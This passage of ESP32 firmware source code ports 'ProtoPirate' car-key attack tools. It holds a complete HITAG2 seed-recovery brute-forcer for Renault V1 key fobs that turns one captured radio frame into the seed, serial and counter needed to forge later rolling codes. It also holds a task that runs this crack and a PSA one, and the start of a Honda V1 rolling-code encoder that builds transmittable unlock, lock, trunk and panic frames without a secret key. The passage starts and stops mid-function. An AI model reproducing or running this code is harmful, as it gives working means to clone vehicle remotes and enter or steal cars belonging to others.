    if(pp_found) { out = pp_result; return true; }
    return false;
}


// ===== Renault V1 HITAG2 seed-recovery (ProtoPirate GPLv3) =====
/* ======================================================================
 * Renault V1 HITAG2 seed-recovery — ProtoPirate (GPLv3)
 * ----------------------------------------------------------------------
 * On-demand IV/seed brute-force cracker fragment. Ported verbatim from
 * ProtoPirate's renault_v1.c (Hitag2BfState / hitag2_bf_prepare /
 * hitag2_bf_hop_matches / hitag2_brute_force_run) and reduced to a single
 * shared state instance driven by the firmware's own task.
 *
 * EVERY emitted symbol is prefixed rv1bf_ / RV1BF_ / Rv1Bf to avoid
 * collision with the pre-existing hitag2_* helpers already present in the
 * same translation unit (decoder + encoder). No bare hitag2_* names emitted.
 *
 * Search space: RV1BF_CANDIDATES = 0x40000 (262144) IV candidates -> <1s
 * on-device. No FlipperFormat, no threads, no on_done callback.
 * ====================================================================== */

/* ---- status codes / search constants -------------------------------- */
#define RV1BF_STATUS_IDLE      0
#define RV1BF_STATUS_RUNNING   1
#define RV1BF_STATUS_FOUND     2
#define RV1BF_STATUS_NOT_FOUND 3
#define RV1BF_STATUS_CANCELLED 4

#define RV1BF_CANDIDATES        0x40000U /* 262144 IV candidates */
#define RV1BF_PROGRESS_INTERVAL 0x400U

/* ---- state ---------------------------------------------------------- */
typedef struct {
    uint8_t frame[11];              /* raw HITAG2 88-bit frame (crack input) */
    volatile uint8_t cancel;
    volatile uint32_t progress_current;
    volatile uint32_t progress_total;
    volatile uint8_t status;
    uint8_t iv[4];                  /* recovered IV (big-endian order iv[0..3]) */

    /* recovered plaintext outputs (valid after RV1BF_STATUS_FOUND) */
    uint32_t r_serial;
    uint16_t r_cnt;
    uint8_t r_btn;
    uint32_t r_seed;                /* 32-bit value for renault_v1_enc_next_with_seed */
} Rv1BfState;

/* ====================================================================== */
/* ==== prefixed crypto (ported verbatim, renamed rv1bf_*) ============== */
/* ====================================================================== */

static uint8_t rv1bf_extract_bits(uint32_t value, uint8_t lsb, uint8_t width) {
    return (uint8_t)((value >> lsb) & ((1U << width) - 1U));
}

static void rv1bf_serial_permute(const uint8_t serial[4], uint8_t perm[6]) {
    const uint8_t sn0 = serial[0];
    const uint8_t sn1 = serial[1];
    const uint8_t sn2 = serial[2];
    const uint8_t sn3 = serial[3];

    uint8_t acc =
        (uint8_t)(((sn0 >> 6) & 2U) | ((sn1 >> 4) & 8U) | rv1bf_extract_bits(sn0 ^ 0x10U, 4, 1));
    acc |= (uint8_t)((~(uint32_t)(sn0 << 2)) & 0x20U);
    acc |= (uint8_t)((sn0 << 5) & 0x40U);
    acc |= (uint8_t)((sn2 << 1) & 0x80U);
    acc |= (uint8_t)((~(uint32_t)(sn2 >> 5)) & 4U);
    acc |= (uint8_t)((~(uint32_t)(sn0 >> 2)) & 0x10U);
    perm[0] = acc;

    const uint8_t sn1_inv_shr3 = (uint8_t) ~(sn1 >> 3);
    const uint8_t sn3_inv_shl3 = (uint8_t) ~(sn3 << 3);
    acc = (uint8_t)(rv1bf_extract_bits(sn1, 5, 1) | (sn1_inv_shr3 & 4U) | (sn0 & 0x20U));
    acc |= (uint8_t)(sn3_inv_shl3 & 8U);
    acc |= (uint8_t)((~(uint32_t)(sn2 << 2)) & 0x10U);
    acc |= (uint8_t)((~(uint32_t)(sn2 << 3)) & 0x40U);
    acc |= 0x80U;
    perm[1] = acc;

    const uint8_t sn0_shr3 = (uint8_t)(sn0 >> 3);
    acc = (uint8_t)(rv1bf_extract_bits(sn0, 2, 1) | (sn0_shr3 & 2U) |
                    ((~(uint32_t)(sn3 >> 2)) & 4U) | (sn1 & 0x10U));
    acc |= (uint8_t)((~(uint32_t)(sn1 << 4)) & 0x20U);
    acc |= (uint8_t)(sn3_inv_shl3 & 0x40U);
    acc |= 0x80U;
    perm[2] = acc;

    const uint8_t sn2_inv_shl6 = (uint8_t) ~(sn2 << 6);
    acc =
        (uint8_t)(((sn0 >> 2) & 2U) | ((sn1 >> 3) & 8U) | rv1bf_extract_bits(sn2 ^ 0x20U, 5, 1));
    acc |= (uint8_t)((sn1 << 5) & 0x20U);
    acc |= (uint8_t)((sn3 << 1) & 0x40U);
    acc |= (uint8_t)(((uint8_t)~sn0_shr3) & 4U);
    acc |= (uint8_t)(sn1_inv_shr3 & 0x10U);
    acc |= (uint8_t)(sn2_inv_shl6 & 0x80U);
    perm[3] = acc;

    uint8_t perm4_lo =
        (uint8_t)(((sn3 << 2) & 8U) | ((sn0 << 4) & 0x10U) | rv1bf_extract_bits(sn0 ^ 4U, 2, 1));
    perm4_lo |= (uint8_t)((~(uint32_t)(sn3 >> 1)) & 2U);
    perm4_lo |= (uint8_t)((~(uint32_t)(sn1 >> 4)) & 4U);
    uint8_t perm4_hi = (uint8_t)((~(uint32_t)(sn0 << 4)) & 0x20U);
    perm4_hi |= (uint8_t)(sn2_inv_shl6 & 0x40U);
    const uint8_t sn1_inv_shl3 = (uint8_t) ~(sn1 << 3);
    perm4_hi |= (uint8_t)(sn1_inv_shl3 & 0x80U);
    perm[4] = (uint8_t)(perm4_lo | perm4_hi);

    uint8_t perm5 =
        (uint8_t)(((sn3 >> 2) & 0x10U) | ((sn2 >> 3) & 2U) | (((uint8_t)~sn0) & 0x80U));
    perm5 |= (uint8_t)((~(uint32_t)(sn0 << 3)) & 8U);
    perm5 |= (uint8_t)((sn0 >> 2) & 0x10U);
    perm5 |= (uint8_t)(sn1_inv_shl3 & 0x20U);
    perm5 |= (uint8_t)((sn3 >> 1) & 0x40U);
    perm5 |= (uint8_t)((~(uint32_t)(sn1 >> 1)) & 4U);
    perm[5] = perm5;
}

static uint8_t rv1bf_truth(uint32_t table, uint8_t index) {
    return (uint8_t)((table >> index) & 1U);
}

static uint8_t rv1bf_filter_index(uint8_t a, uint8_t b, uint8_t c, uint8_t d) {
    return (uint8_t)((a << 3U) | (b << 2U) | (c << 1U) | d);
}

static uint8_t rv1bf_byte_bit(uint8_t byte, uint8_t bit) {
    return (uint8_t)((byte >> bit) & 1U);
}

static uint8_t rv1bf_filter(const uint8_t state[6]) {
    uint8_t group = 0;
    group |= rv1bf_truth(
        0x2C79U,
        rv1bf_filter_index(
            rv1bf_byte_bit(state[0], 1),
            rv1bf_byte_bit(state[0], 2),
            rv1bf_byte_bit(state[0], 4),
            rv1bf_byte_bit(state[0], 5)));
    group |= (uint8_t)(rv1bf_truth(
                           0x6671U,
                           rv1bf_filter_index(
                               rv1bf_byte_bit(state[1], 0),
                               rv1bf_byte_bit(state[1], 1),
                               rv1bf_byte_bit(state[1], 3),
                               rv1bf_byte_bit(state[1], 7)))
                       << 1U);
    group |= (uint8_t)(rv1bf_truth(
                           0x6671U,
                           rv1bf_filter_index(
                               rv1bf_byte_bit(state[3], 5),
                               rv1bf_byte_bit(state[2], 0),
                               rv1bf_byte_bit(state[2], 2),
                               rv1bf_byte_bit(state[2], 6)))
                       << 2U);
    group |= (uint8_t)(rv1bf_truth(
                           0x6671U,
                           rv1bf_filter_index(
                               rv1bf_byte_bit(state[4], 6),
                               rv1bf_byte_bit(state[3], 0),
                               rv1bf_byte_bit(state[3], 2),
                               rv1bf_byte_bit(state[3], 3)))
                       << 3U);
    group |= (uint8_t)(rv1bf_truth(
                           0x2C79U,
                           rv1bf_filter_index(
                               rv1bf_byte_bit(state[5], 1),
                               rv1bf_byte_bit(state[5], 3),
                               rv1bf_byte_bit(state[5], 4),
                               rv1bf_byte_bit(state[4], 5)))
                       << 4U);
    return rv1bf_truth(0x7907287BUL, group);
}

static uint8_t rv1bf_parity8(uint8_t value) {
    value ^= (uint8_t)(value >> 4U);
    value ^= (uint8_t)(value >> 2U);
    value ^= (uint8_t)(value >> 1U);
    return (uint8_t)(value & 1U);
}

static uint8_t rv1bf_feedback(const uint8_t state[6]) {
    static const uint8_t masks[6] = {0xB3U, 0x80U, 0x83U, 0x22U, 0x00U, 0x73U};
    uint8_t feedback = 0;
    for(uint8_t i = 0; i < 6; i++) {
        feedback ^= rv1bf_parity8((uint8_t)(state[i] & masks[i]));
    }
    return (uint8_t)(feedback & 1U);
}

static void rv1bf_shift_state(uint8_t state[6], uint8_t input) {
    for(uint8_t i = 0; i < 5; i++) {
        state[i] = (uint8_t)((state[i] << 1U) | (state[i + 1U] >> 7U));
    }
    state[5] = (uint8_t)((state[5] << 1U) | (input & 1U));
}

static void rv1bf_shift_u32(uint8_t buf[4], uint8_t inject) {
    const uint8_t b0 = buf[0];
    const uint8_t b1 = buf[1];
    const uint8_t b2 = buf[2];
    const uint8_t b3 = buf[3];
    buf[3] = (uint8_t)((b2 >> 7U) | (b3 << 1U));
    buf[2] = (uint8_t)((b1 >> 7U) | (b2 << 1U));
    buf[1] = (uint8_t)((b0 >> 7U) | (b1 << 1U));
    buf[0] = (uint8_t)((b0 << 1U) | (inject & 1U));
}

static void rv1bf_clock_cipher(uint8_t state[6], uint8_t iv_work[4], uint8_t iv_orig[4]) {
    for(uint8_t i = 0; i < 32; i++) {
        const uint8_t filter = rv1bf_filter(state);
        uint8_t mix = (iv_work[3] & 0x80U) ? (filter ? 0U : 1U) : (filter ? 1U : 0U);
        if(iv_orig[3] & 0x80U) {
            mix ^= 5U;
        }
        rv1bf_shift_state(state, (uint8_t)(mix & 1U));
        rv1bf_shift_u32(iv_work, 0);
        rv1bf_shift_u32(iv_orig, (uint8_t)((mix >> 2U) & 1U));
    }

    for(uint8_t i = 0; i < 32; i++) {
        rv1bf_shift_u32(iv_work, 0);
        if(rv1bf_filter(state)) {
            iv_work[0] |= 1U;
        }
        rv1bf_shift_state(state, rv1bf_feedback(state));
    }
}

/* ---- brute-force preparation / match (ported verbatim) -------------- */

static uint32_t rv1bf_seed_from_iv(const uint8_t iv[4]) {
    return ((uint32_t)iv[0] << 24U) | ((uint32_t)iv[1] << 16U) | ((uint32_t)iv[2] << 8U) | iv[3];
}

static void rv1bf_bf_rearrange_dest(uint8_t dest[11]) {
    const uint8_t frame4 = dest[6];
    uint8_t frame5 = dest[5];
    uint8_t frame6 = dest[4];
    uint8_t frame7 = dest[3];
    const uint8_t frame8 = dest[2];
    const uint8_t frame9 = dest[1];

    uint8_t hop0 = (uint8_t)(((frame4 & 1U) << 7U) | (frame5 >> 1U));
    frame5 = (uint8_t)(((frame5 & 1U) << 7U) | (frame6 >> 1U));
    const uint8_t hop0_hi = (uint8_t)(hop0 >> 1U);
    hop0 = (uint8_t)(hop0 & 1U);
    hop0 = (uint8_t)((hop0 << 7U) | (frame5 >> 1U));
    frame6 = (uint8_t)(((frame6 & 1U) << 7U) | (frame7 >> 1U));
    frame5 = (uint8_t)(((frame5 & 1U) << 7U) | (frame6 >> 1U));
    dest[3] = frame5;
    frame7 = (uint8_t)(((frame7 & 1U) << 7U) | (frame8 >> 1U));
    const uint8_t hop2 = (uint8_t)(((frame6 & 1U) << 7U) | (frame7 >> 1U));
    frame6 = (uint8_t)(((frame8 & 1U) << 7U) | (frame9 >> 1U));
    dest[6] = (uint8_t)(((frame9 & 1U) << 7U) | (frame4 >> 2U));
    dest[1] = (uint8_t)(((frame7 & 1U) << 7U) | (frame6 >> 1U));
    dest[5] = (uint8_t)(hop0_hi | (((frame4 >> 1U) & 1U) << 7U));
    dest[2] = hop2;
    dest[4] = hop0;
}

static void rv1bf_bf_prepare(
    const uint8_t frame[11],
    uint8_t serial_be[4],
    uint8_t perm[6],
    uint8_t hop_target[4],
    uint8_t* iv0,
    uint8_t* fp) {
    uint8_t dest[11];
    for(size_t i = 0; i < 11; i++) {
        dest[i] = frame[10U - i];
    }
    rv1bf_bf_rearrange_dest(dest);

    hop_target[0] = dest[1];
    hop_target[1] = dest[2];
    hop_target[2] = dest[3];
    hop_target[3] = dest[4];
    *iv0 = (uint8_t)((frame[4] >> 4U) | (dest[5] << 4U));
    *fp = (uint8_t)((dest[5] >> 4U) | ((dest[6] & 3U) << 4U));

    serial_be[0] = frame[0];
    serial_be[1] = frame[1];
    serial_be[2] = frame[2];
    serial_be[3] = frame[3];
    rv1bf_serial_permute(serial_be, perm);
}

static bool rv1bf_bf_hop_matches(
    const uint8_t serial_be[4],
    const uint8_t perm[6],
    const uint8_t iv[4],
    const uint8_t hop_target[4]) {
    uint8_t state[6];
    uint8_t iv_work[4];
    uint8_t iv_orig[4];

    state[0] = serial_be[0];
    state[1] = serial_be[1];
    state[2] = serial_be[2];
    state[3] = serial_be[3];
    state[4] = perm[4];
    state[5] = perm[5];
    iv_work[0] = perm[0];
    iv_work[1] = perm[1];
    iv_work[2] = perm[2];
    iv_work[3] = perm[3];
    iv_orig[0] = iv[0];
    iv_orig[1] = iv[1];
    iv_orig[2] = iv[2];
    iv_orig[3] = iv[3];
    rv1bf_clock_cipher(state, iv_work, iv_orig);

    return (iv_work[0] == hop_target[0]) && (iv_work[1] == hop_target[1]) &&
           (iv_work[2] == hop_target[2]) && (iv_work[3] == hop_target[3]);
}

/* ---- convenience: names for rv1bf_prepare / rv1bf_hop_matches ------- */
#define rv1bf_prepare     rv1bf_bf_prepare
#define rv1bf_hop_matches rv1bf_bf_hop_matches

/* ====================================================================== */
/* ==== shared state instance + public (static) API ==================== */
/* ====================================================================== */

static Rv1BfState g_rv1_bf;

/*
 * Reconstruct the raw 11-byte HITAG2 frame from the decoder's (data,data_2).
 *   frame[0..7] = data (64-bit, big-endian)   -- serial + btn + cnt10 + hop hi
 *   frame[8]    = (data_2 >> 16) & 0xFF        -- 24-bit tail payload (hop lo + tail)
 *   frame[9]    = (data_2 >>  8) & 0xFF
 *   frame[10]   =  data_2        & 0xFF        -- frame XOR checksum byte
 * This mirrors hitag2_pack_key_bytes()/hitag2_apply_raw() in the source, and
 * the same split used by hitag2_bf_state_from_flipper_format().
 */
static bool rv1_bf_setup(uint64_t data, uint32_t data_2, uint32_t serial, uint8_t btn, uint16_t cnt) {
    for(size_t i = 0; i < 8; i++) {
        g_rv1_bf.frame[i] = (uint8_t)(data >> (8U * (7U - i)));
    }
    g_rv1_bf.frame[8] = (uint8_t)(data_2 >> 16U);
    g_rv1_bf.frame[9] = (uint8_t)(data_2 >> 8U);
    g_rv1_bf.frame[10] = (uint8_t)data_2;

    /* seed decoder plaintext as fallback; overwritten on FOUND */
    g_rv1_bf.r_serial = serial;
    g_rv1_bf.r_btn = btn;
    g_rv1_bf.r_cnt = cnt;
    g_rv1_bf.r_seed = 0;

    g_rv1_bf.iv[0] = 0;
    g_rv1_bf.iv[1] = 0;
    g_rv1_bf.iv[2] = 0;
    g_rv1_bf.iv[3] = 0;

    g_rv1_bf.cancel = 0;
    g_rv1_bf.progress_current = 0;
    g_rv1_bf.progress_total = RV1BF_CANDIDATES;
    g_rv1_bf.status = RV1BF_STATUS_IDLE;
    return true;
}

/*
 * Port of hitag2_brute_force_run() operating on g_rv1_bf, with an added
 * watchdog reset / cooperative yield inside the loop. On FOUND, derive the
 * recovered serial / button (from the frame plaintext) and counter (from the
 * recovered seed), reproducing hitag2_apply_check_remote()'s RECOVERED_YES path.
 */
static void rv1_bf_run(void) {
    Rv1BfState* state = &g_rv1_bf;

    uint8_t serial_be[4];
    uint8_t perm[6];
    uint8_t hop_target[4];
    uint8_t iv0 = 0;
    uint8_t fp = 0;
    rv1bf_bf_prepare(state->frame, serial_be, perm, hop_target, &iv0, &fp);

    state->progress_current = 0;
    state->progress_total = RV1BF_CANDIDATES;
    state->status = RV1BF_STATUS_RUNNING;

    uint8_t iv[4];
    for(uint32_t cand = 0; cand < RV1BF_CANDIDATES; cand++) {
        if((cand & (RV1BF_PROGRESS_INTERVAL - 1U)) == 0U) {
            state->progress_current = cand;
            if(state->cancel) {
                state->status = RV1BF_STATUS_CANCELLED;
                return;
            }
        }
        /* watchdog / cooperative yield */
        if((cand & 8191U) == 0) {
            esp_task_wdt_reset();
            if((cand & 0xFFFFU) == 0) vTaskDelay(1);
        }

        iv[0] = iv0;
        iv[1] = (uint8_t)(fp | ((cand & 3U) << 6U));
        iv[2] = (uint8_t)(cand >> 2U);
        iv[3] = (uint8_t)(cand >> 10U);
        if(rv1bf_bf_hop_matches(serial_be, perm, iv, hop_target)) {
            state->iv[0] = iv[0];
            state->iv[1] = iv[1];
            state->iv[2] = iv[2];
            state->iv[3] = iv[3];

            /* post-recovery extraction (hitag2_apply_check_remote, RECOVERED_YES) */
            const uint32_t seed = rv1bf_seed_from_iv(state->iv);
            state->r_seed = seed;
            state->r_serial = ((uint32_t)state->frame[0] << 24U) |
                              ((uint32_t)state->frame[1] << 16U) |
                              ((uint32_t)state->frame[2] << 8U) | state->frame[3];
            state->r_btn = (uint8_t)((state->frame[4] >> 4U) & 0x0FU);
            state->r_cnt = (uint16_t)(((seed >> 12U) & 0xFF0U) | ((seed << 4U) & 0xF000U) |
                                      (seed >> 28U));

            state->progress_current = RV1BF_CANDIDATES;
            state->status = RV1BF_STATUS_FOUND;
            return;
        }
    }

    state->progress_current = RV1BF_CANDIDATES;
    state->status = state->cancel ? RV1BF_STATUS_CANCELLED : RV1BF_STATUS_NOT_FOUND;
}

/* ---- accessors ------------------------------------------------------ */
static uint8_t rv1_bf_status(void) {
    return g_rv1_bf.status;
}
static uint32_t rv1_bf_progress(void) {
    return g_rv1_bf.progress_current;
}
static uint32_t rv1_bf_total(void) {
    return g_rv1_bf.progress_total;
}
static bool rv1_bf_found(void) {
    return g_rv1_bf.status == RV1BF_STATUS_FOUND;
}
static uint32_t rv1_bf_serial(void) {
    return g_rv1_bf.r_serial;
}
static uint16_t rv1_bf_counter(void) {
    return g_rv1_bf.r_cnt;
}
static uint8_t rv1_bf_button(void) {
    return g_rv1_bf.r_btn;
}
static uint32_t rv1_bf_seed(void) {
    return g_rv1_bf.r_seed;
}

/* ======================================================================
 * DOCUMENTATION
 * ----------------------------------------------------------------------
 * seed (rv1_bf_seed / g_rv1_bf.r_seed):
 *   The recovered 4-byte HITAG2 IV packed big-endian into a uint32:
 *     seed = (iv[0]<<24)|(iv[1]<<16)|(iv[2]<<8)|iv[3]
 *   This is exactly the value the ProtoPirate encoder stores as "Seed" and
 *   feeds back through hitag2_encrypt_frame()/hitag2_build_iv(). It is the
 *   value to pass as `seed` to renault_v1_enc_next_with_seed(serial, btn,
 *   cnt, seed, up, cap); build_iv() reconstructs the same iv from
 *   (cnt, btn, seed), so the round-trip is exact.
 *
 * rv1_bf_setup (data,data_2) -> frame:
 *   frame[0..7] = data as 8 big-endian bytes (serial + btn + cnt10 + hop-hi).
 *   frame[8]  = (data_2>>16)&0xFF, frame[9] = (data_2>>8)&0xFF,
 *   frame[10] =  data_2 & 0xFF  (the decoder's 24-bit generic.data_2 payload:
 *   hop-low bits + tail + XOR checksum). Identical mapping to the source's
 *   hitag2_pack_key_bytes()/hitag2_apply_raw() and the split used by
 *   hitag2_bf_state_from_flipper_format().
 *
 * serial / button / counter recovery (on RV1BF_STATUS_FOUND):
 *   serial = frame[0..3] big-endian (= data>>32), plaintext in the frame.
 *   button = (frame[4] >> 4) & 0x0F, plaintext in the frame.
 *   counter = ((seed>>12)&0xFF0) | ((seed<<4)&0xF000) | (seed>>28), i.e. the
 *   full counter reassembled from the recovered seed/IV nibbles (matches the
 *   RECOVERED_YES branch of hitag2_apply_check_remote()). Before a successful
 *   crack these accessors return the decoder plaintext passed to rv1_bf_setup
 *   (10-bit wire counter).
 *
 * Candidate count: RV1BF_CANDIDATES = 0x40000 (262144) IV candidates.
 *
 * UNRESOLVED symbols: none. The only external symbols used are the shim's
 *   esp_task_wdt_reset() and vTaskDelay(int); everything else (uint types,
 *   size_t, bool) comes from the shim/host. renault_v1_enc_next_with_seed is
 *   referenced only in documentation, not called here.
 *
 * Collision safety: every emitted function/struct/macro is rv1bf_ / RV1BF_ /
 *   Rv1Bf / rv1_bf_ prefixed. No bare hitag2_* symbol is defined, so this
 *   fragment coexists with the existing decoder/encoder hitag2_* helpers in
 *   the same translation unit.
 * ====================================================================== */

// ============================================================================
//  Cracker crypto on-demand (modèle thread ProtoPirate)
//  Le décodeur flague g_pp_bf_ready / g_pp_bf_kind ; l'UI lance le balayage
//  dans une tâche séparée (core 0) avec barre de progression + annulation.
//  La boucle BF nourrit le watchdog et cède le CPU (voir psa_brute_force_run).
// ============================================================================
static TaskHandle_t g_bf_task = nullptr;
static volatile bool g_bf_running = false;

static void pp_bf_task(void* arg) {
    (void)arg;
    if(g_pp_bf_kind == PP_BF_PSA) {
        g_psa_allow_bf = true;
        g_pp_psa_bf.cancel = 0;
        psa_brute_force_run(&g_pp_psa_bf);
        g_psa_allow_bf = false;
    } else if(g_pp_bf_kind == PP_BF_RENAULT_V1) {
        g_rv1_bf.cancel = 0;
        rv1_bf_run();
    }
    g_bf_running = false;
    g_bf_task = nullptr;
    vTaskDelete(nullptr);
}
// Dispo crack : PSA flagué par le décodeur, Renault V1 armé par l'UI (via setup).
static bool pp_bf_available() { return g_pp_bf_ready && g_pp_bf_kind != PP_BF_NONE; }
static void pp_bf_start() {
    if(g_bf_running || g_pp_bf_kind == PP_BF_NONE) return;
    g_bf_running = true;
    xTaskCreatePinnedToCore(pp_bf_task, "PpBf", 4096, nullptr, 1, &g_bf_task, 0);
}
static void pp_bf_cancel() {
    if(g_pp_bf_kind == PP_BF_PSA) g_pp_psa_bf.cancel = 1;
    else if(g_pp_bf_kind == PP_BF_RENAULT_V1) g_rv1_bf.cancel = 1;
}
static bool     pp_bf_is_running() { return g_bf_running; }
// Accessors kind-aware (mêmes valeurs de status : IDLE0/RUN1/FOUND2/NF3/CANC4)
static uint8_t  pp_bf_status()   { return g_pp_bf_kind == PP_BF_RENAULT_V1 ? rv1_bf_status()   : g_pp_psa_bf.status; }
static uint32_t pp_bf_progress() { return g_pp_bf_kind == PP_BF_RENAULT_V1 ? rv1_bf_progress() : g_pp_psa_bf.progress_current; }
static uint32_t pp_bf_total()    { return g_pp_bf_kind == PP_BF_RENAULT_V1 ? rv1_bf_total()    : g_pp_psa_bf.progress_total; }
static uint32_t pp_bf_serial()   { return g_pp_bf_kind == PP_BF_RENAULT_V1 ? rv1_bf_serial()   : g_pp_psa_bf.decrypted_serial; }
static uint32_t pp_bf_counter()  { return g_pp_bf_kind == PP_BF_RENAULT_V1 ? rv1_bf_counter()  : g_pp_psa_bf.decrypted_counter; }
static uint8_t  pp_bf_button()   { return g_pp_bf_kind == PP_BF_RENAULT_V1 ? rv1_bf_button()   : g_pp_psa_bf.decrypted_button; }
// Arme un crack Renault V1 depuis une trame décodée (appelé par l'UI sur K).
static bool pp_bf_arm_renault(uint64_t data, uint64_t data_2, uint32_t serial, uint8_t btn, uint16_t cnt) {
    if(!rv1_bf_setup(data, (uint32_t)data_2, serial, btn, cnt)) return false;
    g_pp_bf_kind = PP_BF_RENAULT_V1;
    g_pp_bf_ready = true;
    return true;
}
static void pp_bf_clear() { g_pp_bf_ready = false; g_pp_bf_kind = PP_BF_NONE; }


// ===== Encoders supplémentaires (ProtoPirate + Flipper-ARF) =====

// --- pp_enc_honda.h ---
/* ======================================================================
 * pp_enc_honda.h  --  ProtoPirate encoder (GPLv3)
 *
 * Self-contained ENCODE-path port of the ProtoPirate Honda car-key
 * protocols (transmit / next-rolling-code) for an ESP32 firmware.
 *
 * Ported ENCODE side only; a decode-side shim already exists and provides:
 *   struct LevelDuration { bool level; uint32_t duration; };
 *   level_duration_make, pp_emit, pp_emit_manchester_bit,
 *   pp_emit_byte_manchester, pp_emit_short_pairs, pp_emit_merge,
 *   pp_reverse_bits8, pp_u64_to_bytes_be, pp_bytes_to_u64_be,
 *   bit_read, DURATION_DIFF, subghz_protocol_blocks_* helpers.
 *
 * Every symbol below is prefixed <p>_enc_ to avoid colliding with the
 * decode-side const/#define names. NO #include / #pragma once here.
 * ====================================================================== */

/* ======================================================================
 * Honda V1  --  ProtoPirate encoder (GPLv3)
 *   Modulation: AM (is_fsk = false)
 *   Rolling code: 16-bit counter, 68-bit frame, dual-CRC Manchester.
 * ====================================================================== */

#define honda_v1_enc_TE_SHORT              1000U
#define honda_v1_enc_FRAME_GAP_US          5000U
#define honda_v1_enc_UPLOAD_CAPACITY       2048U
#define honda_v1_enc_PREAMBLE_UPLOAD_COUNT 180U
#define honda_v1_enc_FRAME_SYMBOLS         80U
#define honda_v1_enc_FRAME_START           12U
#define honda_v1_enc_FRAME_SYNC_DROP       2U
#define honda_v1_enc_FRAME_REPEAT_PER_CRC  2U
#define honda_v1_enc_FRAME_BYTES           9U
#define honda_v1_enc_FRAME_CRC_INDEX       8U
#define honda_v1_enc_FRAME_GENERATED_MAX   (honda_v1_enc_FRAME_SYMBOLS * 2U)
#define honda_v1_enc_FRAME_TAIL_MAX        3U
#define honda_v1_enc_BIT_COUNT             68U
#define honda_v1_enc_SERIAL_MASK           0x0FFFFFFFU
#define honda_v1_enc_COUNTER_MASK          0xFFFFU
#define honda_v1_enc_NIBBLE_MASK           0x0FU
#define honda_v1_enc_BUTTON_MAX            10U
#define honda_v1_enc_BUTTON_VALID_MASK     0x701U
#define honda_v1_enc_BUTTON_FALLBACK_CODE  0x00088888U

static const uint32_t honda_v1_enc_button_codes[honda_v1_enc_BUTTON_MAX + 1U] = {
    0x00080808U, /* [0] Unlock */
    0U, 0U, 0U, 0U, 0U, 0U, 0U, /* [1..7] unused */
    0x00088888U, /* [8]  Lock  */
    0x00099190U, /* [9]  Trunk */
    0x000FA7A0U, /* [10] Panic */
};

static bool honda_v1_enc_button_valid(uint8_t b) {
    if(b > honda_v1_enc_BUTTON_MAX) return false;
    return ((honda_v1_enc_BUTTON_VALID_MASK >> b) & 1U) != 0U;
}

static uint32_t honda_v1_enc_button_code(uint8_t button) {
    if(!honda_v1_enc_button_valid(button)) {
        return honda_v1_enc_BUTTON_FALLBACK_CODE;
    }
    return honda_v1_enc_button_codes[button];
}

static uint64_t honda_v1_enc_build_key(uint32_t serial, uint8_t button, uint16_t counter) {
    const uint32_t table = honda_v1_enc_button_code(button);
    const uint32_t low = ((table & honda_v1_enc_COUNTER_MASK) << 16U) | counter;
    const uint32_t high = ((serial & honda_v1_enc_SERIAL_MASK) << 4U) | (table >> 16U);

    return ((uint64_t)high << 32U) | low;
}

static uint8_t honda_v1_enc_crc_fold(uint16_t v) {
    const uint8_t lo = (uint8_t)(v & honda_v1_enc_NIBBLE_MASK);
    const uint16_t hi = (uint16_t)(v >> 4U);
    int32_t s = (hi & 1U) ? (int32_t)lo : -(int32_t)lo;
    uint8_t out = (uint8_t)((s - (int32_t)hi) & 7);
    out |= (uint8_t)(((v >> 3U) & 1U) << 3U);
    if(((v >> 1U) & 1U) && (((v >> 4U) ^ (v >> 5U)) & 1U)) {
        out ^= 0x04U;
    }
    return (uint8_t)(out & honda_v1_enc_NIBBLE_MASK);
}

static uint8_t honda_v1_enc_checksum_base(uint64_t data) {
    const uint8_t a = honda_v1_enc_crc_fold((uint16_t)(data & honda_v1_enc_COUNTER_MASK));
    const uint8_t b = honda_v1_enc_crc_fold((uint8_t)((data >> 40U) & 0xFFU));
    return (uint8_t)((a ^ b ^ 1U) & honda_v1_enc_NIBBLE_MASK);
}

static uint8_t honda_v1_enc_checksum_alternate(uint8_t checksum) {
    uint8_t mask = 0x09U;
    if((checksum & 1U) == 0U) {
        mask = (checksum & 2U) ? 0x0BU : honda_v1_enc_NIBBLE_MASK;
    }
    return (uint8_t)((checksum ^ mask) & honda_v1_enc_NIBBLE_MASK);
}

static void honda_v1_enc_checksum_wire_order(uint64_t data, uint8_t* first, uint8_t* second) {
    const uint8_t checksum = honda_v1_enc_checksum_base(data);
    const uint8_t other = honda_v1_enc_checksum_alternate(checksum);
    if((checksum & 0x08U) != 0U) {
        *first = other;
        *second = checksum;
    } else {
        *first = checksum;
        *second = other;
    }
}

static bool honda_v1_enc_append_frame(
    LevelDuration* up,
    size_t cap,
    size_t* index,
    const uint8_t frame[honda_v1_enc_FRAME_BYTES]) {
    LevelDuration generated[honda_v1_enc_FRAME_GENERATED_MAX];
    size_t generated_count = 0U;

    for(uint32_t bit_index = 0U; bit_index < honda_v1_enc_FRAME_SYMBOLS; bit_index++) {
        uint32_t bit;

        if(bit_index >= honda_v1_enc_FRAME_START) {
            const uint32_t data_index = (bit_index - honda_v1_enc_FRAME_START) >> 3U;
            const uint8_t shift = (uint8_t)((11U - bit_index) & 0x07U);
            bit = (frame[data_index] >> shift) & 0x01U;
        } else {
            bit = ((uint32_t)~bit_index) & 0x01U;
        }

        generated_count = pp_emit_merge(
            generated,
            generated_count,
            honda_v1_enc_FRAME_GENERATED_MAX,
            bit != 0U,
            honda_v1_enc_TE_SHORT);
        generated_count = pp_emit_merge(
            generated,
            generated_count,
            honda_v1_enc_FRAME_GENERATED_MAX,
            bit == 0U,
            honda_v1_enc_TE_SHORT);
    }

    if(generated_count <= honda_v1_enc_FRAME_SYNC_DROP) {
        return false;
    }

    const size_t copy_count = generated_count - honda_v1_enc_FRAME_SYNC_DROP;
    if((*index + copy_count + honda_v1_enc_FRAME_TAIL_MAX) > cap) {
        return false;
    }

    for(size_t i = 0U; i < copy_count; i++) {
        up[*index + i] = generated[honda_v1_enc_FRAME_SYNC_DROP + i];
    }
    *index += copy_count;

    const bool tail_level = !up[*index - 1U].level;
    *index = pp_emit(up, *index, cap, tail_level, honda_v1_enc_TE_SHORT);
    if(!tail_level) {
        *index = pp_emit(up, *index, cap, true, honda_v1_enc_TE_SHORT);
    }
    *index = pp_emit(up, *index, cap, false, honda_v1_enc_FRAME_GAP_US);
    return true;
}

/* Reconstruct the 68-bit frame from serial/btn/cnt (cnt already incremented
 * by the caller). No secret key required. */
static bool honda_v1_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    uint8_t button = (uint8_t)(btn & honda_v1_enc_NIBBLE_MASK);
    if(!honda_v1_enc_button_valid(button)) {
